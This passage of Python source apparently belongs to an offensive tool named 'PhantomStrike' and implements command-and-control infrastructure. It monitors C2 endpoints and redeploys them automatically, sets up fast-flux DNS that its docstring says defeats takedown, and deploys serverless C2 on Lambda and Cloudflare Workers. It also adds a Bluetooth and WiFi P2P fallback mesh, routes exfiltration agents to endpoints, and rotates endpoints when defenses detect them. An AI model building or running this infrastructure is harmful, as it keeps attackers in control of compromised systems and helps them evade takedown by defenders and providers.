        """Main health-check loop. Runs until stop event is set."""
        while not self._health_stop.is_set():
            try:
                check_start = time.time()
                endpoints = self._all_endpoints_snapshot()
                dead_endpoints = []

                for ep in endpoints:
                    if ep.status == EndpointStatus.DESTROYED:
                        continue
                    healthy, latency = self._health_check(ep)
                    with ep._lock:
                        if healthy:
                            ep.last_health_at = time.time()
                            ep.health_failures = 0
                            ep.latency_ms = latency
                            if ep.status == EndpointStatus.DEPLOYING:
                                ep.status = EndpointStatus.HEALTHY
                            elif latency > 1000:
                                ep.status = EndpointStatus.DEGRADED
                            else:
                                ep.status = EndpointStatus.HEALTHY
                        else:
                            ep.health_failures += 1
                            if ep.health_failures >= 3:
                                ep.status = EndpointStatus.UNHEALTHY
                                dead_endpoints.append(ep)

                # Replace dead endpoints
                for ep in dead_endpoints:
                    logger.warning("Endpoint %s on %s is dead (%d failures). Replacing...",
                                   ep.instance_id, ep.provider, ep.health_failures)
                    self._emit_event("endpoint_unhealthy", ep.to_dict())
                    if self.hive_mind:
                        self.hive_mind.publish("endpoint_unhealthy", ep.to_dict())

                    # Try same provider first, then fall back
                    try:
                        self._destroy_endpoint(ep)
                        self.deploy_c2(provider=ep.provider)
                    except Exception:
                        logger.warning("Same-provider redeploy failed, trying any provider...")
                        try:
                            self.deploy_c2()
                        except Exception as exc:
                            logger.critical("Redeploy failed entirely: %s", exc)

                elapsed = time.time() - check_start
                sleep_time = max(0.5, HEALTH_CHECK_INTERVAL - elapsed)
            except Exception as exc:
                logger.error("Health monitor error: %s", exc, exc_info=True)
                sleep_time = HEALTH_CHECK_INTERVAL

            self._health_stop.wait(sleep_time)

    def _health_check(self, endpoint: Endpoint) -> Tuple[bool, float]:
        """Check if an endpoint is reachable. Returns (healthy: bool, latency_ms: float).

        Uses TLS handshake timing as a lightweight probe — avoids leaving
        request logs. Falls back to TCP connect if TLS setup is too slow.
        """
        host = endpoint.domain or endpoint.public_ip
        port = endpoint.port
        if not host or host == "pending":
            return False, 0.0

        start = time.monotonic()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))

            # Quick TLS handshake
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            try:
                with ctx.wrap_socket(sock, server_hostname=host) as tls:
                    tls.settimeout(3)
                    tls.send(b"PING\r\n")
                    tls.recv(1024)
            except (ssl.SSLError, socket.timeout, ConnectionError):
                pass  # TLS may not be up yet; raw TCP connect is sufficient

            latency = (time.monotonic() - start) * 1000
            sock.close()
            return True, latency
        except Exception:
            latency = (time.monotonic() - start) * 1000
            return False, latency

    def _all_endpoints_snapshot(self) -> List[Endpoint]:
        """Thread-safe snapshot of all endpoints."""
        with self._endpoints_lock:
            result = []
            for provider_endpoints in self._endpoints.values():
                result.extend(provider_endpoints)
            return list(result)

    # ── Fast-flux DNS ────────────────────────────────────────────────────────

    def fast_flux_dns(self, domain: str, ttl: int = DNS_FLUX_DEFAULT_TTL) -> Dict[str, Any]:
        """Set up fast-flux DNS rotation for a domain.

        Every `ttl` seconds the domain resolves to a different endpoint IP
        from the pool. This makes takedown via DNS blacklisting nearly impossible.

        Returns the FluxDomain dict with rotation metadata.

        Args:
            domain: The domain name to set up fast-flux for.
            ttl: Seconds between IP rotation.
        """
        if domain in self._flux_domains:
            return self._flux_domains[domain].__dict__

        flux = FluxDomain(domain=domain, ttl=ttl)
        self._flux_domains[domain] = flux

        # Seed with current healthy endpoints
        self._update_flux_endpoints(flux)

        # Start rotation thread for this domain
        rotator = threading.Thread(
            target=self._flux_rotation_loop,
            args=(flux,),
            name=f"flux-rotator-{domain}",
            daemon=True,
        )
        rotator.start()

        logger.info("Fast-flux DNS started for %s (TTL=%ds, endpoints=%d)",
                     domain, ttl, len(flux.endpoints))
        return {
            "domain": flux.domain,
            "ttl": flux.ttl,
            "endpoint_count": len(flux.endpoints),
            "endpoints": flux.endpoints,
            "rotation_count": flux.rotation_count,
        }

    def _flux_rotation_loop(self, flux: FluxDomain) -> None:
        """Rotate DNS resolution every TTL seconds."""
        while not self._health_stop.is_set():
            self._health_stop.wait(flux.ttl)
            if self._health_stop.is_set():
                break
            self._rotate_flux(flux)

    def _rotate_flux(self, flux: FluxDomain) -> None:
        """Execute one rotation of DNS IPs for a flux domain."""
        with flux._lock:
            self._update_flux_endpoints(flux)
            if not flux.endpoints:
                logger.warning("Flux domain %s has no healthy endpoints to rotate", flux.domain)
                return
            flux.current_index = (flux.current_index + 1) % len(flux.endpoints)
            current_ip = flux.endpoints[flux.current_index]
            flux.rotation_count += 1
            # Update DNS (Cloudflare / Route53 / DNSPod — depends on configured NS provider)
            self._update_dns_record(flux.domain, current_ip, flux.ttl)
            logger.debug("Flux DNS %s -> %s (rotation #%d)", flux.domain, current_ip, flux.rotation_count)

    def _update_flux_endpoints(self, flux: FluxDomain) -> None:
        """Refresh the endpoint IP pool from current healthy endpoints."""
        healthy_ips = [ep.public_ip for ep in self._all_endpoints_snapshot()
                       if ep.status in (EndpointStatus.HEALTHY, EndpointStatus.DEGRADED)
                       and ep.public_ip != "pending"]
        # Also include serverless endpoints
        if self._serverless_endpoint and self._serverless_endpoint.status == EndpointStatus.HEALTHY:
            healthy_ips.append(self._serverless_endpoint.public_ip)
        flux.endpoints = healthy_ips

    def _update_dns_record(self, domain: str, ip: str, ttl: int) -> None:
        """Update DNS A record via the configured DNS provider.

        Supports Cloudflare, AWS Route53, and manual zone-file providers.
        Falls back to /etc/hosts injection if no API provider is configured.
        """
        dns_provider = os.environ.get("DNS_PROVIDER", "").lower()

        if dns_provider == "cloudflare":
            self._update_dns_cloudflare(domain, ip, ttl)
        elif dns_provider == "route53":
            self._update_dns_route53(domain, ip, ttl)
        else:
            # Local /etc/hosts injection for dev/testing
            self._update_dns_hosts(domain, ip)

    def _update_dns_cloudflare(self, domain: str, ip: str, ttl: int) -> None:
        """Update Cloudflare DNS A record via API."""
        import urllib.request as _urllib
        zone_id = os.environ.get("CF_ZONE_ID", "")
        api_token = os.environ.get("CF_API_TOKEN", "")
        if not zone_id or not api_token:
            return

        # Find existing A record
        list_url = f"https://api.cloudflare.com/client/v4/zones/{zone_id}/dns_records?type=A&name={domain}"
        req = _urllib.Request(list_url, headers={"Authorization": f"Bearer {api_token}"})
        try:
            resp = json.loads(_urllib.urlopen(req, timeout=10).read())
            record_id = resp["result"][0]["id"] if resp["result"] else None
        except Exception:
            record_id = None

        payload = json.dumps({"type": "A", "name": domain, "content": ip, "ttl": ttl, "proxied": True}).encode()

        if record_id:
            url = f"https://api.cloudflare.com/client/v4/zones/{zone_id}/dns_records/{record_id}"
            req = _urllib.Request(url, data=payload, method="PATCH",
                                  headers={"Authorization": f"Bearer {api_token}",
                                           "Content-Type": "application/json"})
        else:
            url = f"https://api.cloudflare.com/client/v4/zones/{zone_id}/dns_records"
            req = _urllib.Request(url, data=payload,
                                  headers={"Authorization": f"Bearer {api_token}",
                                           "Content-Type": "application/json"})
        try:
            _urllib.urlopen(req, timeout=10)
        except Exception as exc:
            logger.warning("Cloudflare DNS update failed: %s", exc)

    def _update_dns_route53(self, domain: str, ip: str, ttl: int) -> None:
        """Update AWS Route53 DNS A record."""
        try:
            import boto3
            client = boto3.client("route53")
            zone_id = os.environ.get("ROUTE53_ZONE_ID", "")
            client.change_resource_record_sets(
                HostedZoneId=zone_id,
                ChangeBatch={
                    "Changes": [{
                        "Action": "UPSERT",
                        "ResourceRecordSet": {
                            "Name": domain,
                            "Type": "A",
                            "TTL": ttl,
                            "ResourceRecords": [{"Value": ip}],
                        },
                    }],
                },
            )
        except Exception as exc:
            logger.warning("Route53 DNS update failed: %s", exc)

    def _update_dns_hosts(self, domain: str, ip: str) -> None:
        """Fallback: inject into /etc/hosts (requires root; for dev only)."""
        try:
            hosts_line = f"{ip} {domain}\n"
            with open("/etc/hosts", "r") as f:
                content = f.read()
            if hosts_line.strip() in content:
                return
            # Remove old entry for this domain if present
            lines = [l for l in content.splitlines() if domain not in l.split()]
            lines.append(hosts_line.strip())
            with open("/tmp/phantomstrike_hosts", "w") as f:
                f.write("\n".join(lines) + "\n")
            subprocess.run(["sudo", "cp", "/tmp/phantomstrike_hosts", "/etc/hosts"],
                           capture_output=True, timeout=5)
        except Exception:
            pass  # Silently fail in non-root contexts

    # ── Serverless fallback ──────────────────────────────────────────────────

    def serverless_fallback(self) -> Dict[str, Any]:
        """Deploy C2 as serverless function (AWS Lambda + Cloudflare Worker).

        If all VPS providers fail, this provides a C2 endpoint with:
        - AWS Lambda behind API Gateway HTTP API ($0 cost for low traffic)
        - Cloudflare Worker as reverse-proxy C2 relay

        Returns the serverless endpoint dict.
        """
        results = {}

        # ── AWS Lambda ───────────────────────────────────────────────────────
        try:
            import boto3
            lam = boto3.client("lambda", region_name=os.environ.get("AWS_REGION", "us-east-1"))

            func_name = f"phantomstrike-c2-{secrets.token_hex(4)}"
            lambda_zip = self._build_lambda_package()

            lam.create_function(
                FunctionName=func_name,
                Runtime="python3.12",
                Role=os.environ.get("AWS_LAMBDA_ROLE", ""),
                Handler="c2_handler.lambda_handler",
                Code={"ZipFile": lambda_zip},
                Timeout=30,
                MemorySize=256,
                Environment={"Variables": {"C2_MODE": "serverless", "AGENT_ID": secrets.token_hex(8)}},
            )

            # Create function URL
            url_config = lam.create_function_url_config(
                FunctionName=func_name,
                AuthType="NONE",
                Cors={
                    "AllowOrigins": ["*"],
                    "AllowMethods": ["*"],
                    "AllowHeaders": ["*"],
                },
            )
            func_url = url_config["FunctionUrl"]

            serverless_id = f"lambda-{func_name}"
            self._serverless_endpoint = Endpoint(
                provider="aws_lambda",
                tier=ProviderTier.SERVERLESS,
                instance_id=serverless_id,
                public_ip=func_url.replace("https://", "").rstrip("/"),
                domain=func_url,
                port=443,
                status=EndpointStatus.DEPLOYING,
                metadata={"function_name": func_name, "function_url": func_url},
            )
            self._register_endpoint(self._serverless_endpoint)

            # Mark healthy after cold-start grace period
            def _mark_healthy():
                time.sleep(SERVERLESS_COLD_START_GRACE)
                if self._serverless_endpoint:
                    self._serverless_endpoint.status = EndpointStatus.HEALTHY
            threading.Thread(target=_mark_healthy, daemon=True).start()

            results["aws_lambda"] = {"function_url": func_url, "status": "deployed"}
            logger.info("Serverless C2 deployed on AWS Lambda: %s", func_url)

        except ImportError:
            logger.debug("boto3 not available for Lambda fallback")
        except Exception as exc:
            logger.warning("AWS Lambda deployment failed: %s", exc)
            results["aws_lambda"] = {"error": str(exc)}

        # ── Cloudflare Worker ────────────────────────────────────────────────
        try:
            cf_result = self._deploy_cloudflare_worker()
            results["cloudflare_worker"] = cf_result
            logger.info("Serverless C2 deployed on Cloudflare Workers: %s", cf_result.get("url"))
        except Exception as exc:
            logger.warning("Cloudflare Worker deployment failed: %s", exc)
            results["cloudflare_worker"] = {"error": str(exc)}

        if not results or all("error" in v for v in results.values()):
            raise RuntimeError(f"All serverless deployment strategies failed: {results}")

        return results

    def _build_lambda_package(self) -> bytes:
        """Build a minimal Lambda deployment ZIP containing the C2 handler."""
        handler_code = f'''import json, secrets, hashlib, time, base64
AGENT_ID = "{secrets.token_hex(8)}"
AES_KEY = secrets.token_hex(32)

def lambda_handler(event, context):
    try:
        body = event.get("body", "")
        if event.get("isBase64Encoded"):
            body = base64.b64decode(body).decode()
        if not body:
            return {{"statusCode": 200, "body": json.dumps({{"id": AGENT_ID, "status": "alive"}})}}
        # Echo beacon back with server timestamp
        return {{
            "statusCode": 200,
            "headers": {{"Content-Type": "application/json"}},
            "body": json.dumps({{"id": AGENT_ID, "timestamp": time.time(), "echo": body[:200]}})
        }}
    except Exception as e:
        return {{"statusCode": 500, "body": json.dumps({{"error": str(e)}})}}
'''
        import io, zipfile
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("c2_handler.py", handler_code)
        return buf.getvalue()

    def _deploy_cloudflare_worker(self) -> Dict[str, Any]:
        """Deploy a Cloudflare Worker as C2 relay via the CF API."""
        cf_token = os.environ.get("CF_API_TOKEN", "")
        cf_account = os.environ.get("CF_ACCOUNT_ID", "")
        if not cf_token or not cf_account:
            raise RuntimeError("Cloudflare credentials not configured")

        worker_script = '''
addEventListener("fetch", event => {
    event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
    const url = new URL(request.url)
    const body = await request.text()
    return new Response(JSON.stringify({
        status: "relay",
        agent_id: crypto.randomUUID(),
        timestamp: Date.now(),
        path: url.pathname,
        method: request.method,
        body_length: body.length,
    }), {
        headers: { "content-type": "application/json" }
    })
}
'''
        import urllib.request as _urllib
        worker_name = f"phantomstrike-relay-{secrets.token_hex(4)}"
        url = f"https://api.cloudflare.com/client/v4/accounts/{cf_account}/workers/scripts/{worker_name}"

        payload = json.dumps({"script": worker_script}).encode()
        req = _urllib.Request(
            url, data=payload, method="PUT",
            headers={"Authorization": f"Bearer {cf_token}", "Content-Type": "application/javascript"},
        )
        resp = json.loads(_urllib.urlopen(req, timeout=15).read())

        worker_url = f"https://{worker_name}.{os.environ.get('CF_WORKERS_SUBDOMAIN', 'workers.dev')}"
        return {"worker_name": worker_name, "url": worker_url, "status": "deployed"}

    # ── P2P fallback ─────────────────────────────────────────────────────────

    def p2p_fallback(self) -> Dict[str, Any]:
        """If all internet C2 is severed, switch to Bluetooth mesh / WiFi Direct P2P.

        Uses:
        - Bluetooth RFCOMM: pybluez-based mesh relay
        - WiFi Direct / ad-hoc: scapy Beacon frame discovery + UDP broadcast

        Returns mesh status dict.
        """
        if self._p2p_mesh:
            return dict(self._p2p_mesh)

        mesh_id = secrets.token_hex(4)
        mesh = {
            "mesh_id": mesh_id,
            "mode": "p2p",
            "bluetooth": {"enabled": False, "peers": 0, "error": None},
            "wifi_direct": {"enabled": False, "peers": 0, "error": None},
            "created_at": datetime.now(timezone.utc).isoformat(),
            "status": "initializing",
        }

        # ── Bluetooth RFCOMM mesh ────────────────────────────────────────────
        try:
            import bluetooth as _bt
            server_sock = _bt.BluetoothSocket(_bt.RFCOMM)
            server_sock.bind(("", _bt.PORT_ANY))
            server_sock.listen(1)
            port = server_sock.getsockname()[1]
            _bt.advertise_service(
                server_sock,
                f"PhantomStrike-{mesh_id}",
                service_id=P2P_BLUETOOTH_UUID,
                service_classes=[P2P_BLUETOOTH_UUID, _bt.SERIAL_PORT_CLASS],
                profiles=[_bt.SERIAL_PORT_PROFILE],
            )

            mesh["bluetooth"] = {
                "enabled": True,
                "peers": 0,
                "port": port,
                "uuid": P2P_BLUETOOTH_UUID,
                "discoverable": True,
            }

            def _bt_accept():
                while not self._health_stop.is_set():
                    try:
                        client, addr = server_sock.accept()
                        mesh["bluetooth"]["peers"] += 1
                        threading.Thread(target=self._bt_relay, args=(client, addr),
                                         daemon=True).start()
                    except Exception:
                        break

            threading.Thread(target=_bt_accept, name=f"bt-mesh-{mesh_id}", daemon=True).start()
            logger.info("Bluetooth mesh started: %s (port %d)", mesh_id, port)

        except ImportError:
            mesh["bluetooth"]["error"] = "pybluez not installed"
            logger.debug("pybluez not available for Bluetooth P2P")
        except Exception as exc:
            mesh["bluetooth"]["error"] = str(exc)
            logger.warning("Bluetooth mesh init failed: %s", exc)

        # ── WiFi Direct / ad-hoc broadcast ───────────────────────────────────
        try:
            from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp
            iface = os.environ.get("P2P_IFACE", "wlan0")

            # Beacon frame advertising our mesh
            beacon = (
                RadioTap()
                / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
                        addr2=RandMAC(), addr3=RandMAC())
                / Dot11Beacon(cap="ESS")
                / Dot11Elt(ID="SSID", info=f"PS-MESH-{mesh_id}".encode())
                / Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96")
            )

            def _beacon_loop():
                while not self._health_stop.is_set():
                    try:
                        sendp(beacon, iface=iface, verbose=False, count=1)
                    except Exception:
                        pass
                    time.sleep(0.1)

            threading.Thread(target=_beacon_loop, name=f"wifi-beacon-{mesh_id}", daemon=True).start()

            # UDP discovery listener
            disc_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            disc_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            disc_sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            disc_sock.bind(("0.0.0.0", P2P_DISCOVERY_PORT))

            def _udp_discovery():
                while not self._health_stop.is_set():
                    try:
                        data, addr = disc_sock.recvfrom(1024)
                        msg = json.loads(data.decode())
                        if msg.get("mesh_id") == mesh_id:
                            mesh["wifi_direct"]["peers"] += 1
                    except (socket.timeout, json.JSONDecodeError):
                        continue

            disc_sock.settimeout(2.0)
            threading.Thread(target=_udp_discovery, name=f"wifi-disc-{mesh_id}", daemon=True).start()

            # Broadcast our own presence
            def _udp_broadcast():
                presence = json.dumps({"mesh_id": mesh_id, "hostname": socket.gethostname(), "role": "c2"}).encode()
                while not self._health_stop.is_set():
                    try:
                        disc_sock.sendto(presence, ("255.255.255.255", P2P_DISCOVERY_PORT))
                    except Exception:
                        pass
                    time.sleep(3)

            threading.Thread(target=_udp_broadcast, name=f"wifi-bcast-{mesh_id}", daemon=True).start()

            mesh["wifi_direct"] = {
                "enabled": True,
                "peers": 0,
                "iface": iface,
                "ssid": f"PS-MESH-{mesh_id}",
                "discovery_port": P2P_DISCOVERY_PORT,
            }
            logger.info("WiFi Direct mesh started: SSID=%s, port=%d",
                        f"PS-MESH-{mesh_id}", P2P_DISCOVERY_PORT)

        except ImportError:
            mesh["wifi_direct"]["error"] = "scapy not installed"
            logger.debug("scapy not available for WiFi Direct P2P")
        except Exception as exc:
            mesh["wifi_direct"]["error"] = str(exc)
            logger.warning("WiFi Direct mesh init failed: %s", exc)

        mesh["status"] = "active" if (mesh["bluetooth"]["enabled"] or mesh["wifi_direct"]["enabled"]) else "failed"
        self._p2p_mesh = mesh

        if self._serverless_endpoint is None:
            p2p_ep = Endpoint(
                provider="p2p_mesh",
                tier=ProviderTier.P2P,
                instance_id=f"p2p-{mesh_id}",
                public_ip="0.0.0.0",  # local mesh, no routable IP
                port=P2P_DISCOVERY_PORT,
                status=EndpointStatus.HEALTHY if mesh["status"] == "active" else EndpointStatus.UNHEALTHY,
                metadata=mesh,
            )
            self._register_endpoint(p2p_ep)

        if self.hive_mind:
            self.hive_mind.publish("p2p_mesh_activated", mesh)
        return mesh

    def _bt_relay(self, client_sock, addr) -> None:
        """Bluetooth relay: forward messages to/from a connected peer."""
        try:
            while not self._health_stop.is_set():
                data = client_sock.recv(1024)
                if not data:
                    break
                try:
                    msg = json.loads(data.decode())
                    if self.hive_mind:
                        self.hive_mind.publish("p2p_message", {"source": addr, "message": msg})
                except json.JSONDecodeError:
                    pass
                # Echo acknowledgment
                client_sock.send(json.dumps({"ack": True, "mesh": self._p2p_mesh.get("mesh_id", "")}).encode())
        except Exception:
            pass
        finally:
            try:
                client_sock.close()
            except Exception:
                pass

    # ── Status and introspection ─────────────────────────────────────────────

    def get_status(self) -> Dict[str, Any]:
        """Current infrastructure status — all endpoints, health, uptime, flux domains."""
        endpoints = self._all_endpoints_snapshot()
        healthy = [e for e in endpoints if e.status == EndpointStatus.HEALTHY]
        degraded = [e for e in endpoints if e.status == EndpointStatus.DEGRADED]
        unhealthy = [e for e in endpoints if e.status == EndpointStatus.UNHEALTHY]
        deploying = [e for e in endpoints if e.status == EndpointStatus.DEPLOYING]
        destroyed = [e for e in endpoints if e.status == EndpointStatus.DESTROYED]

        return {
            "total_endpoints": len(endpoints),
            "healthy": len(healthy),
            "degraded": len(degraded),
            "unhealthy": len(unhealthy),
            "deploying": len(deploying),
            "destroyed": len(destroyed),
            "active_providers": list(self._active_providers),
            "uptime_seconds": endpoints[0].uptime_seconds if endpoints else 0,
            "endpoints": [e.to_dict() for e in endpoints],
            "flux_domains": {
                fd.domain: {
                    "ttl": fd.ttl,
                    "endpoints": fd.endpoints,
                    "current_ip": fd.endpoints[fd.current_index % len(fd.endpoints)]
                                  if fd.endpoints else None,
                    "rotation_count": fd.rotation_count,
                }
                for fd in self._flux_domains.values()
            },
            "serverless": self._serverless_endpoint.to_dict() if self._serverless_endpoint else None,
            "p2p_mesh": self._p2p_mesh,
            "health_monitor_running": self._health_thread is not None and self._health_thread.is_alive(),
        }

    # ── Auto-scaling ─────────────────────────────────────────────────────────

    def auto_scale(self, load: int) -> Dict[str, Any]:
        """Deploy additional endpoints if load increases beyond threshold.

        Simple heuristic: scale up when load > healthy_endpoints * capacity,
        scale down when load is low for an extended period.

        Args:
            load: Current connection count or request rate.
        """
        status = self.get_status()
        healthy_count = status["healthy"]
        target = max(1, int(load / 50) + 1)  # 50 connections per endpoint guideline

        actions = []
        if target > healthy_count and healthy_count < MAX_ENDPOINTS_PER_PROVIDER * len(self.PROVIDERS):
            to_deploy = min(target - healthy_count, 3)  # deploy at most 3 at once
            for _ in range(to_deploy):
                try:
                    result = self.deploy_c2()
                    actions.append({"action": "deploy", "provider": result["provider"], "ip": result["public_ip"]})
                except Exception as exc:
                    logger.error("Auto-scale deploy failed: %s", exc)
                    break
        elif target < healthy_count and healthy_count > 1:
            # Don't scale down automatically — manual review for operational safety
            actions.append({"action": "recommend_scale_down", "current": healthy_count, "target": target})

        return {"load": load, "healthy_endpoints": healthy_count, "target": target, "actions": actions}

    # ── Emergency teardown ───────────────────────────────────────────────────

    def destroy_all(self) -> Dict[str, Any]:
        """Emergency teardown — destroy ALL endpoints across ALL providers.

        Stops health monitoring, tears down all VMs, deletes serverless functions,
        shuts down P2P mesh. Returns summary of destroyed resources.
        """
        logger.warning("EMERGENCY: Destroying all C2 infrastructure!")
        self._health_stop.set()

        destroyed = []
        failed = []

        endpoints = self._all_endpoints_snapshot()
        for ep in endpoints:
            success = self._destroy_endpoint(ep)
            if success:
                destroyed.append({"provider": ep.provider, "instance_id": ep.instance_id})
            else:
                failed.append({"provider": ep.provider, "instance_id": ep.instance_id})

        # Destroy serverless endpoints
        if self._serverless_endpoint:
            try:
                if self._serverless_endpoint.provider == "aws_lambda":
                    import boto3
                    lam = boto3.client("lambda", region_name=os.environ.get("AWS_REGION", "us-east-1"))
                    lam.delete_function(
                        FunctionName=self._serverless_endpoint.metadata.get("function_name", "")
                    )
                self._serverless_endpoint = None
            except Exception as exc:
                logger.error("Failed to destroy serverless endpoint: %s", exc)

        # Stop P2P mesh
        self._p2p_mesh = None

        # Clear state
        with self._endpoints_lock:
            self._endpoints.clear()
            self._active_providers.clear()
        self._flux_domains.clear()

        # Join health thread
        if self._health_thread and self._health_thread.is_alive():
            self._health_thread.join(timeout=5)

        if self.hive_mind:
            self.hive_mind.publish("infrastructure_destroyed", {
                "destroyed_count": len(destroyed),
                "failed_count": len(failed),
            })

        summary = {
            "destroyed": len(destroyed),
            "failed": len(failed),
            "details": {"destroyed": destroyed, "failed": failed},
        }
        logger.info("Infrastructure teardown complete: %d destroyed, %d failed",
                    summary["destroyed"], summary["failed"])
        return summary

    # ── Event system ─────────────────────────────────────────────────────────

    def on_event(self, callback: Callable[[str, Dict], None]) -> None:
        """Register an event listener. callback(event_type, data)."""
        self._event_listeners.append(callback)

    def _emit_event(self, event_type: str, data: Dict[str, Any]) -> None:
        for cb in self._event_listeners:
            try:
                cb(event_type, data)
            except Exception:
                pass

    # ── Integration helpers ──────────────────────────────────────────────────

    def get_endpoint_for_agent(self, agent_type: str) -> Optional[Endpoint]:
        """Return the best endpoint for a given agent type.

        Exfil / C2 agents get the fastest endpoint. Recon agents get a
        random healthy endpoint for IP diversity. Cleanup agents get none
        (they operate locally).
        """
        healthy = [e for e in self._all_endpoints_snapshot()
                   if e.status == EndpointStatus.HEALTHY]
        if not healthy:
            healthy = [e for e in self._all_endpoints_snapshot()
                       if e.status == EndpointStatus.DEGRADED]
        if not healthy:
            return None

        if agent_type in ("exfil", "c2"):
            return min(healthy, key=lambda e: e.latency_ms)
        return random.choice(healthy)

    def rotate_endpoint(self, endpoint: Endpoint) -> Optional[Endpoint]:
        """Rotate an endpoint: tear it down and deploy a replacement.

        Used by TraceBuster when a defense alert suggests the endpoint
        has been identified.
        """
        provider = endpoint.provider
        logger.info("Rotating endpoint %s on %s", endpoint.instance_id, provider)
        self._destroy_endpoint(endpoint)
        try:
            result = self.deploy_c2(provider=provider)
            return next((e for e in self._all_endpoints_snapshot()
                        if e.public_ip == result["public_ip"]), None)
        except Exception:
            # Fall back to any provider
            result = self.deploy_c2()
            new_ip = result.get("public_ip", "unknown")
            return next((e for e in self._all_endpoints_snapshot()
                        if e.public_ip == new_ip), None)

    def stop(self) -> None:
        """Graceful shutdown — stop health monitor, but do NOT destroy endpoints."""
        self._health_stop.set()
        if self._health_thread and self._health_thread.is_alive():
            self._health_thread.join(timeout=5)
        logger.info("Infrastructure Fabric stopped (endpoints preserved)")


# ── Module-level convenience ──────────────────────────────────────────────────

def base64_encode(data: str) -> str:
    import base64
    return base64.b64encode(data.encode()).decode()


def _is_base64(s: str) -> bool:
    import base64
    try:
        if isinstance(s, str):
            s = s.encode("ascii")
        base64.b64decode(s, validate=True)
        return True
    except Exception:
        return False
